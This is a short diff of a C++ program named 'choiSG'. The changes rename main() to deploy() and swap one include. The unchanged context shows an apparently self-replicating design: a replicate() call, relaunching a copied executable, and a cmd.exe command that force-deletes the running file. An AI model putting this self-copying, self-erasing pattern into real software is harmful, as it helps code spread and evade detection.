@@ -1,4 +1,5 @@
 
+
 /*
 	choiSG (First cpp program ever coded == Great Spaghetti)
 
@@ -14,7 +15,7 @@
 #include <string>
 #include <iostream>
 #include <strsafe.h>
-// #include <persist.h>
+#include <cstring>
 
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping localhost -n 1 -w 50 > nul & del /f /q \"%s\"")
 
@@ -95,10 +96,10 @@ void DelMe()
 	CloseHandle(pi.hProcess);
 }
 
-void main(int argc, char* argv[])
+void deploy(bool hasRun)
 {
 	// Deployment starts.
-	if (argc == 1)
+	if (!hasRun)
 	{
 		replicate();
 		RunCopiedMe(copyFileDestination, "stop");
